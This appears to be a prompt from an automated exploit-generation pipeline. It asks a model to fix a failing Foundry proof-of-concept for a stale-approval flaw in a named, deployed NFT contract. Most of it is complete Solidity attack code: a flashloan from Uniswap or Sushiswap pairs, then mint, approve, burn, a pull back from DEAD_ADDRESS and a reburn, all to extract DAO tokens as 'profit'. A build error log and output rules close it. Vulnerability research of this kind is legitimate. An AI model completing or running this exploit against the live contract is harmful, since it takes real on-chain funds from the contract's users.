You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Per-token approvals are not cleared on owner or operator transfers, allowing stale approved addresses to steal NFTs
- claim: `approval[tokenId]` is only cleared in the branch where the approved address itself calls `transferFrom`/`safeTransferFrom`. When the owner or an `approvalAll` operator moves the NFT, `_transfer` updates balances and ownership but never resets the old single-token approval. That stale approved address remains authorized against the new owner and can later call `transferFrom` to seize the token. The same stale approval also survives a burn because `burn()` calls `_transfer` directly.
- impact: A previously approved address can steal NFTs after they are sold or otherwise transferred by the owner/operator. It can also reclaim a burned NFT from `DEAD_ADDRESS` without paying the 5 DAO restore cost, bypassing the intended restoration payment flow.
- exploit_paths: ["Owner approves attacker for token `id` via `approve(attacker, id)` -> owner or operator transfers token to a buyer via `transferFrom` or `safeTransferFrom` -> approval is not cleared -> attacker calls `transferFrom(buyer, attacker, id)` and succeeds.", "Owner approves attacker for token `id` -> owner calls `burn(id)` -> token moves to `DEAD_ADDRESS` but approval persists -> attacker calls `transferFrom(DEAD_ADDRESS, attacker, id)` and restores the NFT without paying DAO fees."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ITheNFTV2 {
    function mint(uint256 amount) external;
    function burn(uint256 tokenId) external;
    function approve(address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address private constant TARGET = 0x79a7D3559D73EA032120A69E59223d4375DEb595;
    address private constant DAO = 0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413;
    address private constant DEAD_ADDRESS = 0x000000000000000000000000000000000074eda0;
    uint256 private constant ONE_DAO = 1e16;
    uint256 private constant MAX_SUPPLY = 1800;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    IERC20 private constant DAO_TOKEN = IERC20(DAO);
    ITheNFTV2 private constant NFT = ITheNFTV2(TARGET);

    ApprovedTransferHelper private helper;
    BuyerHolder private buyer;

    address private activePair;
    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        if (address(helper) == address(0)) {
            helper = new ApprovedTransferHelper();
        }
        if (address(buyer) == address(0)) {
            buyer = new BuyerHolder();
        }

        uint256 startDao = DAO_TOKEN.balanceOf(address(this));
        (bool hasToken, uint256 tokenId) = _findOwnedToken();

        if (hasToken) {
            uint256 before = DAO_TOKEN.balanceOf(address(this));
            if (_exerciseExploitPaths(tokenId)) {
                uint256 afterBalance = DAO_TOKEN.balanceOf(address(this));
                if (afterBalance > before + ONE_DAO) {
                    _profitAmount += afterBalance - before - ONE_DAO;
                }
            }
            return;
        }

        if (startDao >= ONE_DAO && DAO_TOKEN.balanceOf(TARGET) >= ONE_DAO) {
            if (_mintOne()) {
                (hasToken, tokenId) = _findOwnedToken();
                if (hasToken && _exerciseExploitPaths(tokenId)) {
                    uint256 endDao = DAO_TOKEN.balanceOf(address(this));
                    if (endDao > startDao) {
                        _profitAmount += endDao - startDao;
                    }
                }
                return;
            }
        }

        if (DAO_TOKEN.balanceOf(TARGET) < ONE_DAO) {
            return;
        }

        (address pair, uint256 amount0Out, uint256 amount1Out) = _findFlashPair();
        if (pair == address(0)) {
            return;
        }

        try this.startFlash(pair, amount0Out, amount1Out) {} catch {}
    }

    function startFlash(address pair, uint256 amount0Out, uint256 amount1Out) external {
        require(msg.sender == address(this), "self only");
        activePair = pair;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(ONE_DAO));
        activePair = address(0);
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == activePair, "invalid pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        uint256 repayAmount = borrowed + ((borrowed * 3) / 997) + 1;

        require(DAO_TOKEN.balanceOf(TARGET) >= ONE_DAO, "no reserve");
        require(_mintOne(), "mint failed");

        (bool hasToken, uint256 tokenId) = _findOwnedToken();
        require(hasToken, "no token");
        require(_exerciseExploitPaths(tokenId), "burn path failed");

        require(DAO_TOKEN.transfer(msg.sender, repayAmount), "repay failed");

        uint256 leftover = DAO_TOKEN.balanceOf(address(this));
        _profitAmount += leftover;
    }

    function profitToken() external pure returns (address) {
        return DAO;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _mintOne() internal returns (bool) {
        if (!DAO_TOKEN.approve(TARGET, ONE_DAO)) {
            return false;
        }
        try NFT.mint(1) {
            return true;
        } catch {
            return false;
        }
    }

    function _exerciseExploitPaths(uint256 tokenId) internal returns (bool) {
        // Owner-transfer path probe:
        // approve(attacker) -> owner transfer to buyer -> attacker tries to steal.
        // For this deployed V2 source, transferFrom clears approval and this stage should fail.
        NFT.approve(address(helper), tokenId);
        NFT.transferFrom(address(this), address(buyer), tokenId);

        bool transferPathWorked = _tryHelperPull(address(buyer), address(this), tokenId);
        if (!transferPathWorked) {
            buyer.returnToken(TARGET, address(this), tokenId);
        }

        // Burn path exploit:
        // approve(attacker) -> burn() -> approval survives -> attacker transfers from DEAD_ADDRESS.
        NFT.approve(address(helper), tokenId);

        uint256 beforeFirstBurn = DAO_TOKEN.balanceOf(address(this));
        NFT.burn(tokenId);
        uint256 afterFirstBurn = DAO_TOKEN.balanceOf(address(this));
        if (afterFirstBurn < beforeFirstBurn + ONE_DAO) {
            return false;
        }

        if (!_tryHelperPull(DEAD_ADDRESS, address(this), tokenId)) {
            return false;
        }

        uint256 beforeSecondBurn = DAO_TOKEN.balanceOf(address(this));
        NFT.burn(tokenId);
        uint256 afterSecondBurn = DAO_TOKEN.balanceOf(address(this));
        return afterSecondBurn >= beforeSecondBurn + ONE_DAO;
    }

    function _tryHelperPull(address from, address to, uint256 tokenId) internal returns (bool) {
        try helper.pull(TARGET, from, to, tokenId) {
            return true;
        } catch {
            return false;
        }
    }

    function _findOwnedToken() internal view returns (bool, uint256) {
        if (NFT.balanceOf(address(this)) == 0) {
            return (false, 0);
        }

        for (uint256 i; i < MAX_SUPPLY; ++i) {
            try NFT.ownerOf(i) returns (address owner) {
                if (owner == address(this)) {
                    return (true, i);
                }
            } catch {}
        }

        return (false, 0);
    }

    function _findFlashPair() internal view returns (address pair, uint256 amount0Out, uint256 amount1Out) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory bases = [WETH, USDC, USDT, DAI];

        for (uint256 i; i < factories.length; ++i) {
            for (uint256 j; j < bases.length; ++j) {
                address candidate = IUniswapV2Factory(factories[i]).getPair(DAO, bases[j]);
                if (candidate == address(0)) {
                    continue;
                }
                if (DAO_TOKEN.balanceOf(candidate) < ONE_DAO) {
                    continue;
                }

                address token0 = IUniswapV2Pair(candidate).token0();
                if (token0 == DAO) {
                    return (candidate, ONE_DAO, 0);
                }
                if (IUniswapV2Pair(candidate).token1() == DAO) {
                    return (candidate, 0, ONE_DAO);
                }
            }
        }
    }
}

contract ApprovedTransferHelper {
    function pull(address target, address from, address to, uint256 tokenId) external {
        ITheNFTV2(target).transferFrom(from, to, tokenId);
    }
}

contract BuyerHolder {
    function returnToken(address target, address to, uint256 tokenId) external {
        ITheNFTV2(target).transferFrom(address(this), to, tokenId);
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: approve(attacker, id), safetransferfrom, transferfrom(buyer, attacker, id), burn(id), transferfrom(dead_address, attacker, id)
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
